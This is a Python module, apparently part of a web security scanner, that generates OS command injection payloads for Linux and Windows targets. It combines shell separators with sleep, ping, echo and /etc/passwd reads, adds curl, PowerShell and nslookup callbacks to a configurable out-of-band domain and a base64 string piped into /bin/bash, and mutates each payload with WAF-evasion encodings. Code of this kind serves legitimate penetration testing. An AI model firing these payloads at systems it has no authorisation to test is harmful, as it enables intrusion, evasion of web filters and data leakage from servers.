import random
import string
from pluck.module import GenerationModule
import base64

class OSCommandInjectionPayloadGenerator(GenerationModule):
    def __init__(self, domain="127.0.0.1", sleep_timeout=15):
        super().__init__()
        self.base_payloads = set()         # Eredeti payloadok
        self.mutated_payloads = set()      # Mutált payloadok
        self.sleep_timeout = sleep_timeout # Konfigurálható timeout érték
        self.unique_string = ""        # Véletlenszerű string a válaszban történő azonosításhoz
        self.domain = domain  # OAST technikákhoz használt cím
        self.possible_results = set()
        self.evidence_strings = []

    def generate_random_string(self, length=12):
        """Generate a random string for reflection testing."""
        self.unique_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_payloads(self):
        """Generate OS command injection payloads with WAF bypass, OAST techniques, and time-based payloads."""
        #self.generate_random_string()
        self.collect_possible_results()

        # Alap Linux és Windows parancsok a konfigurálható timeout értékével
        linux_commands = [
            f"sleep {self.sleep_timeout}",
            f"ping -c {self.sleep_timeout} 127.0.0.1",
            f"echo {self.unique_string}",
            f"echo $(( 1337 * 1337 ))",
            f"yes {self.unique_string} | head -n 3 | tr -d '\n'"
            f"echo "+ base64.b64encode("yes PAYLOAD | head -n 3 | tr -d '\n'".replace("PAYLOAD", self.unique_string).encode()).decode()+" | base64 -d | /bin/bash"
            f"curl http://{self.domain}/?d={self.unique_string}",
            f"nslookup {self.domain}",
        ]

        windows_commands = [
            f"timeout /T {self.sleep_timeout}",
            f"ping -n {self.sleep_timeout} 127.0.0.1",
            f"echo {self.unique_string}",
            f"powershell Invoke-WebRequest -Uri http://{self.domain}/?d={self.unique_string}",
            f"nslookup {self.domain}"
        ]

        # Kontroll karakterek kombinációja
        prefixes_suffixes = [
            ";", "&&", "||", "|", "#", "&",
            "\n", "%0a", "\t", "${IFS}", "`", "'", "\"", "\\", "/"
        ]

        # Bypass technikák
        wildcard_bypass = [
            "cat /e?c/??as?wo?d",            # Wildcard for /etc/passwd
            "cat /pr?c/v?rs??n",             # Wildcard for /proc/version
        ]

        command_substitution = [
            f"`sleep {self.sleep_timeout}`",
            f"$(ping -c {self.sleep_timeout} 127.0.0.1)"
        ]

        #variable_expansion = [
        #    f"p${{PATH}}ing -c {self.sleep_timeout} 127.0.0.1",
        #    f"e${{E}}cho {self.unique_string}"
        #]

        mixed_encoding = [
            "%252fetc%252fpasswd"                                      # Double encoded /etc/passwd
        ]

        chained_commands = [
            f"sleep {int(self.sleep_timeout / 2)+1} && sleep {int(self.sleep_timeout / 2)+1}",
            f"ping -c {self.sleep_timeout} 127.0.0.1 | sleep {self.sleep_timeout}"
        ]

        file_descriptor_manipulation = [
            f"sleep {self.sleep_timeout} < /dev/null",
            f"ping -c {self.sleep_timeout} 127.0.0.1 > /dev/null 2>&1"
        ]

        all_commands = (
            linux_commands + windows_commands +
            wildcard_bypass + command_substitution +
            #variable_expansion + mixed_encoding +
            chained_commands + file_descriptor_manipulation
        )

        # Payloadok létrehozása, az eredeti (nem-mutált) és a mutált payloadok is hozzáadásra kerülnek
        for cmd in all_commands:
            for prefix in prefixes_suffixes:
                for suffix in prefixes_suffixes:
                    payload = f"{prefix}{cmd}{suffix}"
                    self.base_payloads.add(payload)
                    self.mutated_payloads.add(payload)  # Az eredeti payloadokat is hozzáadjuk a végső listához
                    self.apply_waf_bypass(payload)

        return list(self.mutated_payloads)

    def collect_possible_results(self):
        """Collect possible outputs for reflection and time-based testing."""
        # Reflected string keresése a válaszban
        #self.possible_results.add(self.unique_string)

        # OAST eredmények URL lekérdezésekhez
        #self.possible_results.add(f"http://{self.domain}/?d={self.unique_string}")

        # Ismert eredmények idő alapú támadásokhoz
        self.possible_results.add("Request Timeout")
        self.possible_results.add("Ping statistics")
        self.possible_results.add("Waiting for")
        self.possible_results.add("root:x:0:0:root:/root")
        self.possible_results.add("Linux version")
        self.possible_results.add("Copyright (c) 1993-2009 Microsoft Corp.")
        self.possible_results.add("; for 16-bit app support")
        self.possible_results.add("1787569")


        # Kerülő megoldás refaktorálás ellen
        self.evidence_strings = list(self.possible_results)

    def apply_waf_bypass(self, payload):
        """Apply various WAF bypass techniques."""
        # Base64 Encoded payloads
        #base64_encoded = f"echo {payload.encode('utf-8').hex()} | xxd -r -p | bash"
        #self.mutated_payloads.add(base64_encoded)

        # Hex Encoded payloads
        hex_encoded = ''.join(f'\\x{ord(c):02x}' if c.isalnum() else c for c in payload)
        self.mutated_payloads.add(hex_encoded)

        # Unicode Encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
        self.mutated_payloads.add(unicode_encoded)

        # Whitespace Obfuscation
        whitespace_bypass = payload.replace(" ", "${IFS}")
        self.mutated_payloads.add(whitespace_bypass)

        # Inline Comment Injection
        inline_comment = payload.replace(" ", "/*bypass*/")
        self.mutated_payloads.add(inline_comment)

        # Variable substitution bypass
        variable_bypass = payload.replace("e", "${E}")
        self.mutated_payloads.add(variable_bypass)

   


# Példa használat
#if __name__ == "__main__":
#    # Testreszabott timeout érték megadásával
#    generator = OSCommandInjectionPayloadGenerator(domain="my_address.com", sleep_timeout=15)
#    payloads = generator.generate_payloads()
#    for p in payloads:
#      print(p)
